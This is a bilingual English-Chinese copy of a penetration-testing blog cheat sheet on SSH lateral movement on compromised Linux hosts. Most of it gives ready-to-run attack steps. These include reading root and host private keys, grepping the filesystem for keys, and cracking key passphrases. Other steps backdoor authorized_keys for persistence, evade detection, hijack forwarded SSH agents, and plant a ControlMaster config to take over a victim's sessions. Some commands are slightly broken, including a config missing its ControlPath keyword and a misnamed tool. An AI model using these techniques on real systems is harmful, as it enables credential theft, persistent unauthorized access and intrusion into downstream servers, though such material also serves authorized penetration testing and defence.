

# SSH Lateral Movement Cheat Sheet --- SSH 横向移动备忘单

## SSH Lateral Movement Cheat Sheet [∞](https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/ "Permalink")  
SSH 横向移动备忘单 ∞

## What is a Lateral Movement  
什么是横向运动[](#what-is-a-lateral-movement)

A lateral movement typically occurs after a host has been compromised via a reverse shell, and foothold in the network is obtained. Fully compromising the target machine by performing Linux privilege escalation or Windows privilege escalation could be advantageous due to the increased access to files or operating system functionality leveraged by a root level account.  
横向移动通常发生在主机通过反向外壳受到损害并在网络中获得立足点之后。通过执行 Linux 权限提升或 Windows 权限提升来完全破坏目标计算机可能是有利的，因为根级别帐户利用了对文件或操作系统功能的访问增加。

This article focuses specifically on SSH lateral movement techniques on Linux.  
本文将重点介绍 Linux 上的 SSH 横向移动技术。

## SSH Lateral Movement SSH 横向移动[](#ssh-lateral-movement)

SSH private keys are typically an easy way to progress through the network, and are often found with poor permissions or duplicated in home directories. This article does not cover SSH pivoting in depth, we have a separate resource for [SSH pivoting](https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/).  
SSH 私钥通常是在网络中前进的简单方法，并且经常在主目录中发现权限较差或重复。本文不深入介绍 SSH 透视，我们有一个单独的 SSH 透视资源。

##### Enumerate Non UNIX Based Hosts for Private Keys  
枚举私钥的非基于 UNIX 的主机

SSH is not specific to UNIX based operating systems, consider enumerating Windows target for SSH private keys.  
SSH 并不特定于基于 UNIX 的操作系统，请考虑枚举 SSH 私钥的 Windows 目标。

### Manually Look for SSH Keys  
手动查找 SSH 密钥[](#manually-look-for-ssh-keys)

Check home directories and obvious locations for private key files:  
检查私钥文件的主目录和明显位置：

```bash
/home/*
cat /root/.ssh/authorized\_keys 
cat /root/.ssh/identity.pub 
cat /root/.ssh/identity 
cat /root/.ssh/id\_rsa.pub 
cat /root/.ssh/id\_rsa 
cat /root/.ssh/id\_dsa.pub 
cat /root/.ssh/id\_dsa 
cat /etc/ssh/ssh\_config 
cat /etc/ssh/sshd\_config 
cat /etc/ssh/ssh\_host\_dsa\_key.pub 
cat /etc/ssh/ssh\_host\_dsa\_key 
cat /etc/ssh/ssh\_host\_rsa\_key.pub 
cat /etc/ssh/ssh\_host\_rsa\_key 
cat /etc/ssh/ssh\_host\_key.pub 
cat /etc/ssh/ssh\_host\_key
cat ~/.ssh/authorized\_keys 
cat ~/.ssh/identity.pub 
cat ~/.ssh/identity 
cat ~/.ssh/id\_rsa.pub 
cat ~/.ssh/id\_rsa 
cat ~/.ssh/id\_dsa.pub 
cat ~/.ssh/id\_dsa 
```

### Search For Files Containing SSH Keys  
搜索包含 SSH 密钥的文件[](#search-for-files-containing-ssh-keys)

```bash
 
grep -ir "-----BEGIN RSA PRIVATE KEY-----" /home/*
grep -ir "BEGIN DSA PRIVATE KEY" /home/*

grep -ir "BEGIN RSA PRIVATE KEY" /*
grep -ir "BEGIN DSA PRIVATE KEY" /*
```

### Identify The Host for the Key  
确定密钥的主机[](#identify-the-host-for-the-key)

##### Hashed known\_hosts 散列known\_hosts

Modern Linux systems may hash the known\_hosts file entries to help prevent against enumeration.  
现代 Linux 系统可能会对known\_hosts文件条目进行哈希处理，以帮助防止枚举。

If you find a key you then need to identify what server the key is for. In an attempt to idenitfy what host the key is for the following locations should be checked:  
如果找到一个密钥，则需要确定该密钥适用于哪个服务器。为了确定以下位置的密钥是哪个主机，应检查：

```bash
/etc/hosts 
~/.known_hosts
~/.bash_history 
~/.ssh/config 
```

### Cracking SSH Passphrase Keys  
破解SSH密码密钥[](#cracking-ssh-passphrase-keys)

If the discovered SSH key is encrypted with a passphrase this can be cracked locally (much faster), below are several methods. If you have access to a GPU hashcat should be leveraged to improve the cracking time.  
如果发现的SSH密钥是用密码加密的，则可以在本地破解（速度更快），以下是几种方法。如果您可以访问 GPU，则应利用 hashcat 来缩短破解时间。

#### Cracking SSH Passphrase with John the Ripper  
与开膛手约翰一起破解SSH密码[](#cracking-ssh-passphrase-with-john-the-ripper)

John the Ripper has a function to convert he key to a hash called john2hash.py and comes pre installed on Kali.  
开膛手约翰有一个功能，可以将他的密钥转换为称为 john2hash.py 的哈希值，并预装在 Kali 上。

1.  Convert the hash: python /usr/share/john/ssh2john.py id\_rsa > id\_rsa.hash-john  
    转换哈希：python /usr/share/john/ssh2john.py id\_rsa > id\_rsa.hash-john
2.  Use a comprehensive wordlist: john –wordlist=/usr/share/wordlists/rockyou.txt id\_rsa.hash-john  
    使用全面的单词列表：john –wordlist=/usr/share/wordlists/rockyou.txt id\_rsa.hash-john
3.  Wait and hope 等待和希望

##### Help Avoid Detection 帮助避免检测

Avoid directly connecting from a unknown host to the target SSH server, use an already known host to help prevent detection alerts being issued.  
避免从未知主机直接连接到目标 SSH 服务器，使用已知主机来帮助防止发出检测警报。

### SSH Passphrase Backdoor SSH 密码后门[](#ssh-passphrase-backdoor)

While you have access to the compromised host, it is typically a good idea to backdoor the SSH authorized\_keys file which will allow for passwordless login at a point in the future. This should provide an easier and more reliable connection than exploiting and accessing via a reverse shell; and potentially reduce the risk of detection.  
虽然您可以访问受感染的主机，但通常最好对 SSH authorized\_keys文件进行后门，这将允许在将来的某个时候进行无密码登录。这应该提供比通过反向 shell 开发和访问更简单、更可靠的连接;并可能降低被发现的风险。

Adding the key is simply a case of paste a SSH public key, generated on your attacking machine and pasting it into the ~/ssh/authorized\_keys file on the compromised machine.  
添加密钥只需粘贴在攻击计算机上生成的 SSH 公钥，并将其粘贴到受感染计算机上的 ~/ssh/authorized\_keys 文件中。

1.  run ssh-keygen -t rsa -b 4096  
    运行 ssh-keygen -t rsa -b 4096
2.  cat id\_rsa.pub and copy the file contents  
    cat id\_rsa.pub 并复制文件内容
3.  echo “SSH key data” » ~/.ssh/authorized\_keys  
    echo “SSH 密钥数据” » ~/.ssh/authorized\_keys
4.  Test you can connect using the private key without being prompted for a password  
    测试是否可以使用私钥进行连接，而不会提示输入密码

## SSH Agent Forwarding Hijacking  
SSH 代理转发劫持[](#ssh-agent-forwarding-hijacking)

Starting point: You have SSH already backdoored the compromised host by adding your public key to the ~/.authorized\_keys file.  
起点：您已经通过将公钥添加到 ~/.authorized\_keys 文件对受感染的主机进行了 SSH 后门。

### How SSH Agent Works  
SSH 代理的工作原理[](#how-ssh-agent-works)

SSH agent works by allowing the Intermediary machine to pass-through (forward) your SSH key from your client to the next downstream server, allowing the machine in the middle (potentially a bastion host) to use your key without having physical access to your key as they are not stored on the intermediate host but simply forwarded on to the downstream target server.  
SSH 代理的工作原理是允许中间计算机将 SSH 密钥从客户端传递（转发）到下一个下游服务器，从而允许中间计算机（可能是堡垒主机）使用密钥，而无需物理访问密钥，因为它们不存储在中间主机上，而只是转发到下游目标服务器。

-   Access the machine where the existing victim user session is established  
    访问建立现有受害者用户会话的计算机
-   Root level access to the machine where the victim session is established  
    对建立受害者会话的计算机的根级别访问权限
-   A current victim SSH connection with agent forwarding enabled  
    启用了代理转发的当前受害者 SSH 连接

Your Machine => Intermediary Host (forwards your key) => Downstream Machine  
您的计算机 => 中间主机（转发您的密钥）=> 下游计算机

#### The Risk 风险[](#the-risk)

The primary risk of using SSH Agent Forwarding is if the intermediatory machine is compromised, and the attacker has significant permissions they could, potentially use the established session socket to gain access to downstream servers.  
使用 SSH 代理转发的主要风险是，如果中间计算机遭到入侵，并且攻击者拥有大量权限，他们可能会使用已建立的会话套接字来访问下游服务器。

### How To Hijack SSH Agent Forwarding  
如何劫持SSH代理转发[](#how-to-hijack-ssh-agent-forwarding)

Attacking Machine => Compromised Intermediary Host (with SSH Key) => Downsteam Machine (final destination)  
攻击机器 => 被入侵的中间主机（使用 SSH 密钥）=> Downsteam 机器（最终目的地）

SSH agent forwarding allows a user to connect to other machines without entering passwords. This functionality can be exploited to access any host the compromised users SSH key has access to (without having direct access to the keys), while there is an active session.  
SSH 代理转发允许用户在不输入密码的情况下连接到其他计算机。当存在活动会话时，可以利用此功能访问受感染用户 SSH 密钥有权访问的任何主机（无需直接访问密钥）。

A potentially easier way to think of SSH agent forwarding, is to think of it as assigning the SSH key to the active SSH session, while the session is in place it is possible to access the SSH key and connect to other machines that the SSH key has access.  
考虑 SSH 代理转发的一种可能更简单的方法是将其视为将 SSH 密钥分配给活动 SSH 会话，当会话就位时，可以访问 SSH 密钥并连接到 SSH 密钥有权访问的其他计算机。

In order to exploit SSH agent forwarding an active session must be open between the user client (that you wish to hijack) and the compromised intermediary host. You will also require access to the host where the user is connected with superuser privileges (such as `su - username`, or `sudo`) to access the account running the active SSH session you wish to hijack.  
为了利用 SSH 代理转发，必须在用户客户端（您希望劫持）和受感染的中间主机之间打开活动会话。您还需要访问用户使用超级用户权限（例如 `su - username` 或 `sudo` ）连接的主机，以访问运行您希望劫持的活动 SSH 会话的帐户。

##### If -A SSH Connection Fails  
如果 -A SSH 连接失败

If -A fails to connect, perform the following: \`\`\`echo "ForwardingAgent yes" >> ~/.ssh/config\`\`\` to enable agent forwarding.  
如果 -A 连接失败，请执行以下操作：'''echo “ForwardingAgent yes” >> ~/.ssh/config''' 以启用代理转发。

#### Client Instructions 客户须知[](#client-instructions)

Run the following on your local client machine:  
在本地客户端计算机上运行以下命令：

You may need to create a new key, if so run `ssh-add`.  
您可能需要创建一个新密钥，如果是这样，请运行 `ssh-add` 。

1.  Open an SSH connection using agent forwarding to the compromised host `ssh -A user@compromsied-host`  
    使用代理转发到受感染主机 `ssh -A user@compromsied-host` 打开 SSH 连接
2.  Verify agent forwarding is working by using: `ssh-add -l`  
    使用以下方法验证代理转发是否正常工作： `ssh-add -l`
3.  Obtain root: `sudo -s` 获取root： `sudo -s`
4.  Gain access to the account you wish to access: `su - victim`  
    访问您希望访问的帐户： `su - victim`
5.  Access any SSH connection the private key of the victim has access  
    访问受害者私钥有权访问的任何 SSH 连接

### SSH Hijacking with ControlMaster  
使用 ControlMaster 进行 SSH 劫持[](#ssh-hijacking-with-controlmaster)

OpenSSH has a function called **ControlMaster** that enables the sharing of multiple sessions over a single network connection. Allowing you to connect to the server once and have all other subsequent SSH sessions use the initial connection.  
OpenSSH 有一个名为 ControlMaster 的功能，它支持通过单个网络连接共享多个会话。允许您连接到服务器一次，并让所有其他后续 SSH 会话使用初始连接。

In order to exploit SSH ControlMaster you first need shell level access to the target; you will then need sufficient privileges to modify the config of a user to enable the ControlMaster functionality.  
为了利用 SSH ControlMaster，您首先需要对目标进行 shell 级别的访问;然后，您将需要足够的权限来修改用户的配置以启用 ControlMaster 功能。

1.  Gain shell level access to the target machine  
    获得对目标计算机的 shell 级别访问权限
2.  Access the victim users home directory and create / modify the file `~/.ssh/config`  
    访问受害用户主目录并创建/修改文件 `~/.ssh/config`
3.  Add the following configuration:  
    添加以下配置：

```bash
Host *

ControlMaster auto
~/.ssh/master-socket/%r@%h:%p
ControlPersist yes
```

1.  ensure the master-socket directory exists if it does not, create it `mkdir ~/.ssh/master-socket/`  
    确保 master-socket 目录不存在，请创建它 `mkdir ~/.ssh/master-socket/`
2.  Ensure the correct permissions are in place for the config file `chmod 600 ~/.ssh/config`  
    确保配置文件 `chmod 600 ~/.ssh/config` 具有正确的权限
3.  Wait for the victim to login and establish a connection to another server  
    等待受害者登录并建立与另一台服务器的连接
4.  View the directory created at step 4 to observe the socket file: `ls -lat ~/.ssh/master-socket`  
    查看在步骤 4 中创建的目录以观察套接字文件： `ls -lat ~/.ssh/master-socket`
5.  To hijack the existing connection ssh to user@hostname / IP listed in step 7  
    劫持现有连接 ssh 到步骤 7 中列出的 user@hostname/IP

If you know of more techniques let me know on twitter @Arr0way  
如果您知道更多技术，请在 twitter 上告诉我@Arr0way

Enjoy. 享受。
